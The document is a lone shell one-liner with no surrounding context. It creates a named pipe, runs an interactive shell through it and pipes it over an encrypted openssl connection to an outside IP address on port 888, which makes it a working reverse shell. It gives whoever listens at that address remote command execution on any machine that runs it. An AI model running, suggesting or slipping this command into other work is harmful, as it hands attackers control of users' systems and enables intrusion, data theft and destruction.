mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 95.179.187.132:888> /tmp/s; rm /tmp/s
